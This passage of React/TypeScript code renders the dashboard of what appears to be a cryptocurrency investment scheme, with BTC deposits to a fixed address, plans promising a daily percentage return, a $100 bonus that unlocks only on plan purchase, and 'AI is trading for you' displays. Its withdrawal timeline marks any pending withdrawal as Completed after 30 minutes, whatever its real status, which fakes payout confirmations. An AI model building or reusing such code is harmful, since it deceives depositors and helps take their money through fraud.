                      <div className="flex items-center gap-6 flex-wrap">
                        <div>
                          <div className="text-[11px] text-muted-foreground">Committed</div>
                          <div className="font-semibold text-sm tabular-nums">
                            $
                            {Number(inv.amount).toLocaleString(undefined, {
                              minimumFractionDigits: 2,
                            })}
                          </div>
                        </div>

                        <div>
                          <div className="text-[11px] text-muted-foreground">Current Valuation</div>
                          <div className="font-bold text-sm tabular-nums text-foreground">
                            $
                            {Number(inv.current_value).toLocaleString(undefined, {
                              minimumFractionDigits: 2,
                            })}
                          </div>
                        </div>

                        <div>
                          <div className="text-[11px] text-muted-foreground">Accumulated Gain</div>
                          <div
                            className={`text-sm font-extrabold tabular-nums ${
                              profitInv >= 0 ? "text-accent" : "text-destructive"
                            }`}
                          >
                            {profitInv >= 0 ? "+" : "-"}${Math.abs(profitInv).toFixed(2)} (
                            {roiPct >= 0 ? `+${roiPct.toFixed(1)}%` : `${roiPct.toFixed(1)}%`})
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </section>

        {/* BTC Deposit Box */}
        <div className="rounded-2xl border border-accent/40 bg-card p-6 glow-accent">
          <div className="flex items-start gap-4 flex-wrap">
            <div className="h-12 w-12 rounded-xl bg-accent/15 grid place-items-center text-accent text-xl font-bold">
              ₿
            </div>
            <div className="flex-1 min-w-[220px]">
              <div className="flex items-center gap-2 flex-wrap">
                <span className="text-sm font-semibold">
                  Deposit BTC to fund your cash balance & investments
                </span>
                <span className="text-[10px] uppercase font-bold px-2 py-0.5 rounded-full bg-accent/15 text-accent border border-accent/30">
                  Direct Multi-Sig Custody
                </span>
              </div>
              <div className="text-xs text-muted-foreground mt-0.5">
                Input the exact amount of BTC you wish to deposit to generate a scannable payment QR
                code and copy the recipient vault address.
              </div>
              <div className="font-mono text-xs md:text-sm break-all mt-2.5 p-2.5 rounded-xl bg-background/90 border border-border flex items-center justify-between gap-2">
                <span className="truncate select-all">{BTC_ADDRESS}</span>
                <button
                  onClick={copyAddr}
                  className="text-xs text-accent hover:underline font-sans font-medium shrink-0 ml-2"
                >
                  {copied ? "Copied" : "Quick Copy"}
                </button>
              </div>
              {copied && (
                <div className="mt-2 inline-flex items-center gap-1.5 text-xs font-semibold text-accent">
                  <Check className="h-3.5 w-3.5" /> Recipient wallet address copied to clipboard
                </div>
              )}
            </div>
            <div className="flex flex-col sm:flex-row gap-2 shrink-0">
              <Button
                onClick={() => openDepositModal()}
                className="bg-accent text-accent-foreground hover:bg-accent/90 font-bold text-xs shadow-sm"
              >
                <ArrowDownToLine className="h-4 w-4 mr-1.5" /> Deposit BTC (Input Amount & QR)
              </Button>
              <Button variant="outline" onClick={copyAddr} className="text-xs">
                {copied ? (
                  <>
                    <Check className="h-4 w-4 mr-1.5" /> Copied
                  </>
                ) : (
                  <>
                    <Copy className="h-4 w-4 mr-1.5" /> Copy address
                  </>
                )}
              </Button>
            </div>
          </div>
        </div>

        {/* 14-day Chart + Quick Actions */}
        <div className="grid lg:grid-cols-3 gap-4">
          <div className="lg:col-span-2 rounded-2xl border border-border bg-card p-5">
            <div className="flex items-center justify-between mb-3">
              <div>
                <div className="text-sm text-muted-foreground">
                  Earnings projection & growth (14 days)
                </div>
                <div className="text-2xl font-bold">
                  ${currentValue.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
              </div>
              <span className="text-xs text-accent font-semibold flex items-center gap-1">
                <Bot className="h-3.5 w-3.5" /> AI ACTIVE
              </span>
            </div>
            <div className="h-64">
              <ResponsiveContainer>
                <LineChart data={chartData}>
                  <CartesianGrid stroke="var(--color-border)" strokeDasharray="3 3" />
                  <XAxis dataKey="day" stroke="var(--color-muted-foreground)" fontSize={11} />
                  <YAxis stroke="var(--color-muted-foreground)" fontSize={11} />
                  <Tooltip
                    contentStyle={{
                      background: "var(--color-card)",
                      border: "1px solid var(--color-border)",
                      borderRadius: 12,
                    }}
                  />
                  <Line
                    type="monotone"
                    dataKey="value"
                    stroke="oklch(0.78 0.2 145)"
                    strokeWidth={2.5}
                    dot={false}
                  />
                </LineChart>
              </ResponsiveContainer>
            </div>
          </div>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-3">
            <div className="font-semibold">Quick actions</div>
            <Button className="w-full justify-start" onClick={() => openDepositModal()}>
              <ArrowUpRight className="h-4 w-4 mr-2" /> Deposit BTC
            </Button>
            <Button
              variant="outline"
              className="w-full justify-start"
              onClick={() => setWdOpen((v) => !v)}
            >
              <ArrowDownToLine className="h-4 w-4 mr-2" /> Withdraw
            </Button>
            {wdOpen && (
              <div className="rounded-xl border border-border bg-background/50 p-3 space-y-2">
                <div>
                  <label className="text-xs text-muted-foreground">Amount (USD)</label>
                  <Input
                    type="number"
                    min="0"
                    step="0.01"
                    placeholder="0.00"
                    value={wdAmount}
                    onChange={(e) => setWdAmount(e.target.value)}
                  />
                </div>
                <div>
                  <label className="text-xs text-muted-foreground">
                    Destination wallet address
                  </label>
                  <Input
                    placeholder="BTC / USDT wallet address"
                    value={wdWallet}
                    onChange={(e) => setWdWallet(e.target.value)}
                  />
                </div>
                <div className="text-[11px] text-muted-foreground">
                  Available: ${cashBalance.toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
                <Button
                  disabled={wdSubmitting}
                  onClick={submitWithdraw}
                  className="w-full bg-accent text-accent-foreground hover:bg-accent/90"
                >
                  {wdSubmitting ? "Processing…" : "Submit withdrawal"}
                </Button>
              </div>
            )}
            <div className="pt-3 border-t border-border">
              <div className="text-xs text-muted-foreground mb-2">Live network transactions</div>
              <LiveFeed />
            </div>
          </div>
        </div>

        {/* Investment Plans Section */}
        <div id="investment-plans" className="scroll-mt-20">
          <div className="flex items-center justify-between flex-wrap gap-2 mb-3">
            <div>
              <h2 className="text-xl font-bold">Activate an investment plan</h2>
              <p className="text-xs text-muted-foreground">
                Select an institutional plan to deploy capital with automated AI algorithmic
                trading.
              </p>
            </div>
            {isBonusLocked && (
              <span className="text-xs font-semibold text-amber-400 bg-amber-500/10 border border-amber-500/30 px-3 py-1 rounded-full flex items-center gap-1">
                <Lock className="h-3 w-3" /> Any plan unlocks your $100 welcome bonus
              </span>
            )}
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-5 gap-4">
            {plans.map((p) => {
              const currentInput = customPlanAmounts[p.name];
              const investAmt =
                typeof currentInput === "number" && !isNaN(currentInput) && currentInput > 0
                  ? currentInput
                  : p.minAmount;
              const hasEnough = cashBalance >= investAmt;
              const shortfall = Math.max(0, investAmt - cashBalance);

              return (
                <div
                  key={p.name}
                  className={`rounded-2xl border bg-card p-5 flex flex-col justify-between transition-all relative ${
                    p.featured
                      ? "border-accent shadow-md shadow-accent/10 ring-1 ring-accent/30"
                      : hasEnough
                        ? "border-accent/40 shadow-sm"
                        : "border-border hover:border-accent/40"
                  }`}
                >
                  {p.featured && (
                    <div className="absolute -top-3 left-1/2 -translate-x-1/2 bg-accent text-accent-foreground text-[10px] font-extrabold px-3 py-0.5 rounded-full uppercase tracking-wider shadow-sm">
                      Most Popular
                    </div>
                  )}

                  <div>
                    <div className="flex items-center justify-between gap-1">
                      <span className="text-sm font-bold text-foreground">{p.name} Plan</span>
                      <span className="text-xs text-accent font-bold bg-accent/10 px-2 py-0.5 rounded-full whitespace-nowrap">
                        {p.roi}% / day
                      </span>
                    </div>

                    <div className="mt-2.5">
                      <div className="text-xl font-extrabold text-foreground tracking-tight">
                        {p.range}
                      </div>
                      <div className="text-[11px] font-bold text-accent mt-0.5">{p.bonus}</div>
                      <div className="text-[11px] text-muted-foreground mt-0.5 flex items-center justify-between">
                        <span>{p.hash}</span>
                        <span>{p.duration} days</span>
                      </div>
                    </div>

                    <div className="text-[11px] text-muted-foreground/80 mt-2 line-clamp-1 border-t border-border/40 pt-2">
                      {p.strategy}
                    </div>

                    {/* Perks list matching home page */}
                    <ul className="mt-2.5 space-y-1 text-[11px] text-muted-foreground">
                      {p.perks.slice(0, 3).map((perk) => (
                        <li key={perk} className="flex items-center gap-1.5 truncate">
                          <CheckCircle2 className="h-3 w-3 text-accent shrink-0" />
                          <span className="truncate">{perk}</span>
                        </li>
                      ))}
                    </ul>

                    {/* Custom deployment amount input */}
                    <div className="mt-3 pt-3 border-t border-border/60">
                      <div className="flex items-center justify-between text-[11px] text-muted-foreground mb-1">
                        <span>Deploy Amount:</span>
                        <span className="font-mono font-bold text-foreground">
                          ${investAmt.toLocaleString()}
                        </span>
                      </div>
                      <div className="relative">
                        <span className="absolute left-2.5 top-1/2 -translate-y-1/2 text-xs text-muted-foreground font-mono">
                          $
                        </span>
                        <Input
                          type="number"
                          min={p.minAmount}
                          max={p.maxAmount}
                          step={p.minAmount >= 10000 ? 5000 : 250}
                          value={currentInput ?? p.minAmount}
                          onChange={(e) => {
                            const val = e.target.value === "" ? 0 : Number(e.target.value);
                            setCustomPlanAmounts((prev) => ({ ...prev, [p.name]: val }));
                          }}
                          className="h-8 pl-6 text-xs font-mono bg-background/60"
                        />
                      </div>
                      <div className="flex items-center justify-between text-[10px] text-muted-foreground mt-1">
                        <button
                          type="button"
                          onClick={() =>
                            setCustomPlanAmounts((prev) => ({ ...prev, [p.name]: p.minAmount }))
                          }
                          className="hover:text-accent underline cursor-pointer"
                        >
                          Min: ${p.minAmount.toLocaleString()}
                        </button>
                        <button
                          type="button"
                          onClick={() =>
                            setCustomPlanAmounts((prev) => ({ ...prev, [p.name]: p.maxAmount }))
                          }
                          className="hover:text-accent underline cursor-pointer"
                        >
                          Max: ${p.maxAmount.toLocaleString()}
                        </button>
                      </div>
                    </div>
                  </div>

                  <div className="mt-4 pt-3 border-t border-border/60 space-y-2">
                    {isBonusLocked && (
                      <div className="text-[10px] font-bold text-amber-400 bg-amber-500/10 rounded px-2 py-1 text-center border border-amber-500/20">
                        🎁 Unlocks $100 Welcome Bonus
                      </div>
                    )}

                    {!hasEnough ? (
                      <div className="text-[10px] text-destructive bg-destructive/10 border border-destructive/20 rounded px-2 py-1 text-center font-medium flex items-center justify-center gap-1">
                        <AlertTriangle className="h-3 w-3 shrink-0" />
                        <span>Need ${shortfall.toLocaleString()} in cash balance</span>
                      </div>
                    ) : (
                      <div className="text-[10px] text-accent bg-accent/10 border border-accent/20 rounded px-2 py-1 text-center font-medium">
                        ✓ Cash balance sufficient
                      </div>
                    )}

                    <Button
                      onClick={() => startPlan(p, investAmt)}
                      className={`w-full text-xs font-semibold ${
                        hasEnough
                          ? "bg-accent text-accent-foreground hover:bg-accent/90"
                          : "bg-muted text-foreground hover:bg-accent hover:text-accent-foreground border border-border"
                      }`}
                    >
                      {hasEnough
                        ? `Activate Plan ($${investAmt.toLocaleString()})`
                        : "Activate Plan (Requires Funds)"}
                    </Button>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Live AI Trade execution tracker */}
        <div>
          <h2 className="text-xl font-bold mb-3">AI is trading for you</h2>
          <AiTradeTracker />
        </div>

        {/* Withdrawal status timeline */}
        <div>
          <h2 className="text-xl font-bold mb-3">Withdrawal status</h2>
          <WithdrawalTimeline transactions={transactions} />
        </div>

        {/* Transaction History */}
        <div>
          <h2 className="text-xl font-bold mb-3">Transaction history</h2>
          {transactions.length === 0 ? (
            <div className="rounded-2xl border border-dashed border-border bg-card/50 p-8 text-center text-muted-foreground">
              No transactions recorded yet.
            </div>
          ) : (
            <div className="rounded-2xl border border-border bg-card divide-y divide-border overflow-hidden">
              {transactions.map((t) => {
                const isIn = ["deposit", "bonus", "roi", "profit"].includes(t.type);
                const Icon = isIn
                  ? ArrowDownCircle
                  : t.type === "withdrawal"
                    ? ArrowUpCircle
                    : Clock;
                const color = isIn
                  ? "text-accent"
                  : t.type === "withdrawal"
                    ? "text-destructive"
                    : "text-muted-foreground";
                return (
                  <div key={t.id} className="flex items-center justify-between gap-3 p-4">
                    <div className="flex items-center gap-3 min-w-0">
                      <Icon className={`h-5 w-5 ${color} shrink-0`} />
                      <div className="min-w-0">
                        <div className="font-semibold capitalize text-sm">{t.type}</div>
                        <div className="text-xs text-muted-foreground truncate">
                          {t.note ?? "—"}
                        </div>
                      </div>
                    </div>
                    <div className="text-right shrink-0">
                      <div className={`font-bold tabular-nums text-sm ${color}`}>
                        {isIn ? "+" : t.type === "withdrawal" ? "-" : ""}$
                        {Number(t.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                      </div>
                      <div className="text-[11px] text-muted-foreground">
                        <span
                          className={`px-1.5 py-0.5 rounded text-[10px] font-medium ${
                            t.status === "completed" || t.status === "active"
                              ? "bg-accent/15 text-accent"
                              : "bg-muted text-muted-foreground"
                          }`}
                        >
                          {t.status}
                        </span>
                        <span className="ml-2">{new Date(t.created_at).toLocaleDateString()}</span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </div>
      </main>

      {/* Deposit Modal with exact BTC input, address copy, and scannable QR code */}
      <DepositModal
        open={depositModalOpen}
        onClose={() => setDepositModalOpen(false)}
        onDepositSubmitted={() => load()}
        initialBtcAmount={depositPlanContext.btcAmount}
        initialUsdAmount={depositPlanContext.requiredUsd}
        planName={depositPlanContext.planName}
      />

      {/* Insufficient Funds Modal with direct Deposit CTA */}
      {insufficientPlan && (
        <InsufficientFundsModal
          open={insufficientModalOpen}
          onClose={() => setInsufficientModalOpen(false)}
          onOpenDeposit={(pName, reqUsd) => {
            setInsufficientModalOpen(false);
            openDepositModal({
              planName: pName,
              requiredUsd: reqUsd,
              btcAmount: (reqUsd / 67452.18).toFixed(5),
            });
          }}
          planName={insufficientPlan.name}
          planAmount={insufficientPlan.amount}
          cashBalance={cashBalance}
        />
      )}
    </div>
  );
}

type Stage = "Pending" | "Processing" | "Completed" | "Failed";
const STAGES: Stage[] = ["Pending", "Processing", "Completed", "Failed"];

function deriveStages(tx: Transaction, now: number) {
  const created = new Date(tx.created_at).getTime();
  const mins = (now - created) / 60000;
  const status = tx.status.toLowerCase();
  const timeline: Record<Stage, { done: boolean; active: boolean; at: Date | null }> = {
    Pending: { done: false, active: false, at: new Date(created) },
    Processing: { done: false, active: false, at: null },
    Completed: { done: false, active: false, at: null },
    Failed: { done: false, active: false, at: null },
  };
  if (status === "failed" || status === "rejected" || status === "cancelled") {
    timeline.Pending.done = true;
    timeline.Processing.done = true;
    timeline.Processing.at = new Date(created + 2 * 60000);
    timeline.Failed.active = true;
    timeline.Failed.at = new Date(created + Math.max(3, mins) * 60000);
    return timeline;
  }
  if (status === "completed" || status === "success" || status === "paid") {
    timeline.Pending.done = true;
    timeline.Processing.done = true;
    timeline.Processing.at = new Date(created + 2 * 60000);
    timeline.Completed.active = true;
    timeline.Completed.at = new Date(created + Math.max(5, mins) * 60000);
    return timeline;
  }
  if (mins < 2) {
    timeline.Pending.active = true;
  } else if (mins < 30) {
    timeline.Pending.done = true;
    timeline.Processing.active = true;
    timeline.Processing.at = new Date(created + 2 * 60000);
  } else {
    timeline.Pending.done = true;
    timeline.Processing.done = true;
    timeline.Processing.at = new Date(created + 2 * 60000);
    timeline.Completed.active = true;
    timeline.Completed.at = new Date(created + 30 * 60000);
  }
  return timeline;
}

function WithdrawalTimeline({ transactions }: { transactions: Transaction[] }) {
  const [now, setNow] = useState(() => Date.now());
  useEffect(() => {
    const t = setInterval(() => setNow(Date.now()), 10000);
    return () => clearInterval(t);
  }, []);
  const withdrawals = transactions.filter((t) => t.type === "withdrawal");
  if (withdrawals.length === 0) {
    return (
      <div className="rounded-2xl border border-dashed border-border bg-card/50 p-8 text-center text-muted-foreground text-sm">
        No withdrawals requested yet. Submit a withdrawal above to monitor live network
        confirmations.
      </div>
    );
  }
  return (
    <div className="space-y-4">
      {withdrawals.map((w) => {
        const tl = deriveStages(w, now);
        const currentStage: Stage = (STAGES.find((s) => tl[s].active) ??
          (tl.Completed.done ? "Completed" : "Pending")) as Stage;
        const isFailed = currentStage === "Failed";
        return (
          <div key={w.id} className="rounded-2xl border border-border bg-card p-5">
            <div className="flex items-center justify-between flex-wrap gap-2 mb-4">
              <div>
                <div className="font-semibold tabular-nums">
                  -${Number(w.amount).toLocaleString(undefined, { minimumFractionDigits: 2 })}
                </div>
                <div className="text-xs text-muted-foreground truncate max-w-[280px]">
                  {w.note ?? "Withdrawal"}
                </div>
              </div>
              <span
                className={`text-[11px] font-bold uppercase tracking-widest px-2 py-1 rounded-full flex items-center gap-1 ${
                  isFailed
                    ? "bg-destructive/15 text-destructive"
                    : currentStage === "Completed"
                      ? "bg-accent/15 text-accent"
                      : "bg-muted text-muted-foreground"
                }`}
              >
                {currentStage === "Completed" ? (
                  <CheckCircle2 className="h-3 w-3" />
                ) : isFailed ? (
                  <XCircle className="h-3 w-3" />
                ) : (
                  <Loader2 className="h-3 w-3 animate-spin" />
                )}
                {currentStage}
              </span>
            </div>

            <ol className="relative flex flex-col sm:flex-row gap-4 sm:gap-0">
              {(isFailed
                ? (["Pending", "Processing", "Failed"] as Stage[])
                : (["Pending", "Processing", "Completed"] as Stage[])
              ).map((s, i, arr) => {
                const entry = tl[s];
                const isLast = i === arr.length - 1;
                const done = entry.done;
                const active = entry.active;
                const failed = s === "Failed" && active;
                return (
                  <li
                    key={s}
                    className="flex-1 flex sm:flex-col items-start sm:items-center gap-3 sm:gap-2 relative"
                  >
                    <div className="flex sm:flex-col items-center gap-3 sm:gap-2 sm:w-full">
                      <div
                        className={`h-8 w-8 rounded-full grid place-items-center border-2 shrink-0 z-10 ${
                          failed
                            ? "bg-destructive/15 border-destructive text-destructive"
                            : done
                              ? "bg-accent border-accent text-accent-foreground"
                              : active
                                ? "bg-accent/15 border-accent text-accent"
                                : "bg-muted border-border text-muted-foreground"
                        }`}
                      >
                        {done ? (
                          <CheckCircle2 className="h-4 w-4" />
                        ) : failed ? (
                          <XCircle className="h-4 w-4" />
                        ) : active ? (
                          <Loader2 className="h-4 w-4 animate-spin" />
                        ) : (
                          <span className="text-xs font-bold">{i + 1}</span>
                        )}
                      </div>
                      {!isLast && (
                        <div
                          className={`hidden sm:block absolute top-4 left-1/2 h-0.5 w-full ${
                            done ? "bg-accent" : "bg-border"
                          }`}
                        />
                      )}
                    </div>
                    <div className="sm:text-center">
                      <div
                        className={`text-sm font-semibold ${
                          failed
                            ? "text-destructive"
                            : active || done
                              ? "text-foreground"
                              : "text-muted-foreground"
                        }`}
                      >
                        {s}
                      </div>
                      <div className="text-[11px] text-muted-foreground tabular-nums">
                        {entry.at
                          ? entry.at.toLocaleString([], {
                              month: "short",
                              day: "numeric",
                              hour: "2-digit",
                              minute: "2-digit",
                            })
                          : "—"}
                      </div>
                    </div>
                  </li>
                );
              })}
            </ol>
          </div>
        );
      })}
    </div>
  );
}
